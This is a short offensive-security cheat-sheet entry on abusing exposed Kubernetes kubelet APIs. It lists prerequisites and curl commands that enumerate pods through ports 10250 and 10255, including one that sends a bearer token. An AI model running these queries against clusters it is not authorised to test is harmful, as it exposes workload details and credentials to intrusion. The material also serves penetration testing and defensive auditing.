---
technique: Kubelet API Abuse
category: privilege-escalation
targets: Kubernetes Kubelet
protocols: HTTPS
remote_capable: true
tags: kubernetes privilege-escalation kubelet api pods
---

# Kubelet API Abuse

Kubelet API abuse targets exposed or weakly authenticated kubelet endpoints that can list pods, retrieve logs, or execute commands.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Kubelet reachability | TCP 10250 or read-only 10255 must be reachable |
| Authentication gap | Endpoint must allow anonymous, token, or client certificate access |
| Node context | Impact is scoped to workloads on the target node |

## Linux

### Kubelet pods endpoint

#sh #kubelet #http

Query the kubelet pods endpoint.

```sh title:"Query kubelet pods endpoint"
curl -k "https://$node_ip:10250/pods"
```
<!-- cheat
var node_ip
-->

### Kubelet running pods

#sh #kubelet #http

Query the kubelet running pods endpoint.

```sh title:"Query kubelet running pods"
curl -k "https://$node_ip:10250/runningpods/"
```
<!-- cheat
var node_ip
-->

### Read-only kubelet pods

#sh #kubelet #http

Query the legacy read-only kubelet pods endpoint.

```sh title:"Query read-only kubelet pods"
curl "http://$node_ip:10255/pods"
```
<!-- cheat
var node_ip
-->

### Kubelet with bearer token

#sh #kubelet #token

Query kubelet with a bearer token.

```sh title:"Query kubelet with bearer token"
curl -k -H "Authorization: Bearer $token" "https://$node_ip:10250/pods"
```
<!-- cheat
var token
var node_ip
-->
